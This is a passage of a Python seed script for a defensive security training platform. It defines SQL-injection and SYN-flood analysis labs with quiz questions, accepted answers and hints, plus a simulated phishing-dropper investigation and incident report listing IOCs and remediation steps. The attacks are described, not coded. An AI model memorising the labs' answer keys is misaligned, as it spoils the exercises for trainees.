                    "explanation": "Using Parameterized Queries (Prepared Statements) treats user input strictly as data rather than executable SQL syntax."
                }
            ]),
            hints_json=json.dumps([
                "Hint 1: Check the first IP column in the access log.",
                "Hint 2: Examine the User-Agent string at the end of the log line.",
                "Hint 3: Look at the table name specified after the SQL keyword 'FROM'."
            ]),
            explanations_json=json.dumps({
                "summary": "SQL injection occurs when untrusted user input is directly concatenated into database queries. WAFs provide temporary defense while prepared statements fix the root cause."
            }),
            skills_json=json.dumps(["Web Log Analysis", "SQL Injection Detection", "WAF Rules", "AppSec Defense"])
        ),
        Lab(
            lab_number=7,
            title="Lab 07 — DDoS Volumetric Traffic Anomaly & Mitigation",
            category="Network & Infrastructure",
            difficulty="Intermediate",
            scenario="""Perimeter edge telemetry detected a dramatic throughput spike directed against corporate gateway router EDGE-ROUTER (192.168.1.1).
Analyze the incoming packet rate, protocol distribution, and bandwidth saturation to confirm the attack type and recommend mitigation.""",
            learning_objectives_json=json.dumps([
                "Analyze network telemetry during high-volume DDoS incidents",
                "Measure normal baseline vs anomalous traffic peaks (pps and Mbps)",
                "Identify TCP SYN flood characteristics and packet header metrics",
                "Implement upstream BGP routing and rate limiting defensive countermeasures"
            ]),
            evidence_json=json.dumps([
                {"metric": "Baseline Traffic Rate", "value": "12 Mbps (2,500 packets/sec)"},
                {"metric": "Peak Attack Traffic Rate", "value": "450 Mbps (85,000 packets/sec)"},
                {"metric": "Dominant Protocol", "value": "TCP (SYN packets without completing handshake)"},
                {"metric": "Target Port", "value": "Port 80 (HTTP)"},
                {"metric": "Source IP Distribution", "value": "Spoofed addresses across 203.0.113.0/24 subnet"},
                {"metric": "Gateway CPU Utilization", "value": "98% (Interrupt saturation)"}
            ]),
            questions_json=json.dumps([
                {
                    "id": "q1",
                    "question": "What was the peak packet rate per second during the flood attack?",
                    "type": "text",
                    "accepted_answers": ["85000", "85,000", "85k"],
                    "points": 25,
                    "explanation": "Telemetry logged 85,000 packets per second at the height of the volumetric flood."
                },
                {
                    "id": "q2",
                    "question": "What specific type of Denial of Service attack was observed?",
                    "type": "choice",
                    "options": ["TCP SYN Flood", "Ping of Death", "DNS Amplification", "Slowloris"],
                    "accepted_answers": ["TCP SYN Flood"],
                    "points": 25,
                    "explanation": "Massive incoming TCP SYN packets without completed three-way handshakes characterizes a TCP SYN flood."
                },
                {
                    "id": "q3",
                    "question": "What destination port was primarily targeted?",
                    "type": "text",
                    "accepted_answers": ["80", "port 80"],
                    "points": 25,
                    "explanation": "Target port was HTTP port 80."
                },
                {
                    "id": "q4",
                    "question": "Which edge defense mechanism helps mitigate TCP SYN floods without dropping legitimate connections?",
                    "type": "choice",
                    "options": ["SYN Cookies", "Unplugging the network cable", "Rebooting the server every hour", "Disabling DNS"],
                    "accepted_answers": ["SYN Cookies"],
                    "points": 25,
                    "explanation": "SYN cookies allow the gateway to respond to SYN packets without allocating state table memory until the client returns ACK."
                }
            ]),
            hints_json=json.dumps([
                "Hint 1: Look at the metric for Peak Attack Traffic Rate in packets/sec.",
                "Hint 2: Review the Dominant Protocol row in the evidence table.",
                "Hint 3: Consider the classic kernel mitigation technique that encodes state inside TCP sequence numbers."
            ]),
            explanations_json=json.dumps({
                "summary": "Volumetric DDoS floods saturate bandwidth and router connection state tables. Mitigation relies on SYN cookies, rate limiting, and upstream scrubbing."
            }),
            skills_json=json.dumps(["Traffic Analysis", "DDoS Mitigation", "Network Telemetry", "Infrastructure Hardening"])
        )
    ]
    db.add_all(labs_data)
    db.commit()

    # 10. Sample Investigations
    investigation_sample = Investigation(
        title="Investigation: Threat Actor Infiltration via Phishing Dropper",
        incident_id=2,
        alert_id=2,
        status="Active",
        nodes_json=json.dumps([
            {"id": "node-alert", "label": "Alert: Suspicious PowerShell", "type": "Alert", "severity": "CRITICAL"},
            {"id": "node-event", "label": "Event: ID 4688 Process Creation", "type": "Event", "severity": "HIGH"},
            {"id": "node-user", "label": "User: alex.executive", "type": "User", "severity": "MEDIUM"},
            {"id": "node-host", "label": "Host: WORKSTATION-CEO", "type": "Host", "severity": "CRITICAL"},
            {"id": "node-ip", "label": "C2 IP: 45.33.32.156", "type": "IP", "severity": "CRITICAL"},
            {"id": "node-ioc", "label": "IOC: svchost_updater.exe", "type": "IOC", "severity": "CRITICAL"},
            {"id": "node-mitre", "label": "MITRE: T1059.001 PowerShell", "type": "MITRE", "severity": "HIGH"},
            {"id": "node-incident", "label": "Incident: Executive Laptop Phishing", "type": "Incident", "severity": "CRITICAL"}
        ]),
        edges_json=json.dumps([
            {"from": "node-alert", "to": "node-event", "label": "triggered by"},
            {"from": "node-event", "to": "node-user", "label": "executed by"},
            {"from": "node-user", "to": "node-host", "label": "logged on to"},
            {"from": "node-host", "to": "node-ip", "label": "connected to"},
            {"from": "node-host", "to": "node-ioc", "label": "contains"},
            {"from": "node-event", "to": "node-mitre", "label": "maps to"},
            {"from": "node-alert", "to": "node-incident", "label": "escalated to"}
        ]),
        timeline_json=json.dumps([
            {"time": "10:42:01", "event": "Inbound Phishing Email Received", "detail": "bankofamer1ca-notice.com SPF failed."},
            {"time": "10:43:15", "event": "User Opened Attachment", "detail": "invoice_2026.pdf.exe executed from Downloads."},
            {"time": "10:43:18", "event": "PowerShell Download Cradle", "detail": "Downloaded invoke.ps1 from malicious-c2.net."},
            {"time": "10:44:00", "event": "C2 Beacon Established", "detail": "Outbound connection to 45.33.32.156:443."},
            {"time": "10:45:30", "event": "Host Quarantined by SOC L1", "detail": "Network connection severed via EDR."}
        ]),
        notes="High confidence incident. Attacker attempted credential harvesting; endpoint quarantined before domain admin credentials could be extracted."
    )
    db.add(investigation_sample)
    db.commit()

    # 11. Initial Sample Report
    report_sample = Report(
        incident_id=2,
        title="Executive Summary & Technical Incident Report: Phishing & Dropper Remediation",
        executive_summary="On September 12, 2026, the SentinelLab Security Operations Center triaged and successfully contained a Critical severity spearphishing and malware incident targeting executive endpoint WORKSTATION-CEO. The endpoint was quarantined within 15 minutes of initial C2 beaconing, preventing data exfiltration.",
        technical_details="Root cause investigation established that an inbound spoofed email from billing@bankofamer1ca-notice.com delivered a weaponized double-extension binary invoice_2026.pdf.exe. Execution spawned an obfuscated PowerShell cradle that established TCP 443 communications with C2 IP 45.33.32.156.",
        affected_assets_json=json.dumps([
            {"type": "Host", "identifier": "WORKSTATION-CEO (192.168.1.140)", "status": "Quarantined"},
            {"type": "User Identity", "identifier": "alex.executive", "status": "Credentials Revoked"}
        ]),
        timeline_json=json.dumps([
            {"timestamp": "2026-09-12 10:42:01", "stage": "Detection", "action": "Email gateway logged SPF verification failure."},
            {"timestamp": "2026-09-12 10:43:15", "stage": "Triage", "action": "Windows Security Event 4688 logged base64 encoded powershell.exe."},
            {"timestamp": "2026-09-12 10:44:00", "stage": "Investigation", "action": "Network sensor detected outbound beacon to 45.33.32.156."},
            {"timestamp": "2026-09-12 10:45:30", "stage": "Containment", "action": "SOC L1 analyst isolated host and revoked Kerberos session tickets."}
        ]),
        iocs_json=json.dumps([
            {"type": "IP", "value": "45.33.32.156", "confidence": "100%", "source": "EDR Sensor"},
            {"type": "Domain", "value": "malicious-c2.net", "confidence": "95%", "source": "PowerShell Decoder"},
            {"type": "Hash", "value": "e3b0c44298fc1c149afbf4c8996fb924", "confidence": "100%", "source": "Antivirus EDR"},
            {"type": "Filename", "value": "invoice_2026.pdf.exe", "confidence": "95%", "source": "Email Gateway"}
        ]),
        mitre_mapping_json=json.dumps([
            "T1566.001 - Spearphishing Attachment",
            "T1059.001 - Command and Scripting Interpreter: PowerShell",
            "T1071.001 - Application Layer Protocol: Web Protocols",
            "T1562.001 - Impair Defenses: Disable Tools"
        ]),
        findings="Host telemetry confirmed containment was executed before lateral movement across the internal 192.168.1.0/24 subnet could take place.",
        actions_taken="1. Isolated WORKSTATION-CEO from enterprise network.\n2. Terminated powershell.exe and svchost_updater.exe PIDs.\n3. Added 45.33.32.156 and malicious-c2.net to perimeter firewall and DNS sinkholes.\n4. Reset Active Directory credentials for user alex.executive.",
        recommendations="1. Enforce PowerShell Constrained Language Mode (CLM) via Group Policy.\n2. Configure email gateway to quarantine executable attachments regardless of extension.\n3. Conduct phishing awareness training for corporate executives.\n4. Deploy EDR automated containment playbooks for known malicious C2 IP hits.",
        conclusion="Threat eradicated. Zero enterprise data exfiltration confirmed. Host scheduled for clean OS re-imaging."
    )
    db.add(report_sample)
    db.commit()

    print("SentinelLab database successfully initialized and seeded with 100+ events, 20+ alerts, 5 incidents, 15+ IOCs, and 7 learning labs.")
